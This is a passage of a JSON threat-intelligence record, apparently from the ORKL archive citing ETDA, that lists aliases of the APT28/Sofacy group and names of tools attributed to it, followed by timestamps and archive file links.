                "APT 28",
                "ATK 5",
                "Blue Athena",
                "BlueDelta",
                "FROZENLAKE",
                "Fancy Bear",
                "Fighting Ursa",
                "Forest Blizzard",
                "Grey-Cloud",
                "Grizzly Steppe",
                "Group 74",
                "GruesomeLarch",
                "ITG05",
                "Iron Twilight",
                "Operation DealersChoice",
                "Operation Dear Joohn",
                "Operation Komplex",
                "Operation Pawn Storm",
                "Operation Russian Doll",
                "Operation Steal-It",
                "Pawn Storm",
                "SIG40",
                "Sednit",
                "Snakemackerel",
                "Sofacy",
                "Strontium",
                "T-APT-12",
                "TA422",
                "TAG-0700",
                "TAG-110",
                "TG-4127",
                "Tsar Team",
                "UAC-0028",
                "UAC-0063"
            ],
            "source_name": "ETDA:Sofacy",
            "tools": [
                "ADVSTORESHELL",
                "AZZY",
                "Backdoor.SofacyX",
                "CHERRYSPY",
                "CORESHELL",
                "Carberp",
                "Computrace",
                "DealersChoice",
                "Delphacy",
                "Downdelph",
                "Downrage",
                "Drovorub",
                "EVILTOSS",
                "Foozer",
                "GAMEFISH",
                "GooseEgg",
                "Graphite",
                "HATVIBE",
                "HIDEDRV",
                "Headlace",
                "Impacket",
                "JHUHUGIT",
                "JKEYSKW",
                "Koadic",
                "Komplex",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "LoJack",
                "LoJax",
                "MASEPIE",
                "Mimikatz",
                "NETUI",
                "Nimcy",
                "OCEANMAP",
                "OLDBAIT",
                "PocoDown",
                "PocoDownloader",
                "Popr-d30",
                "ProcDump",
                "PythocyDbg",
                "SMBExec",
                "SOURFACE",
                "SPLM",
                "STEELHOOK",
                "Sasfis",
                "Sedkit",
                "Sednit",
                "Sedreco",
                "Seduploader",
                "Shunnael",
                "SkinnyBoy",
                "Sofacy",
                "SofacyCarberp",
                "SpiderLabs Responder",
                "Trojan.Shunnael",
                "Trojan.Sofacy",
                "USB Stealer",
                "USBStealer",
                "VPNFilter",
                "Win32/USBStealer",
                "WinIDS",
                "Winexe",
                "X-Agent",
                "X-Tunnel",
                "XAPS",
                "XTunnel",
                "Xagent",
                "Zebrocy",
                "Zekapab",
                "carberplike",
                "certutil",
                "certutil.exe",
                "fysbis",
                "webhp"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716495,
    "ts_updated_at": 1743041831,
    "ts_creation_date": 1614766673,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/5183b51959c244b3215f7e95e1560241e7e9a34a.pdf",
        "text": "https://archive.orkl.eu/5183b51959c244b3215f7e95e1560241e7e9a34a.txt",
        "img": "https://archive.orkl.eu/5183b51959c244b3215f7e95e1560241e7e9a34a.jpg"
    }
}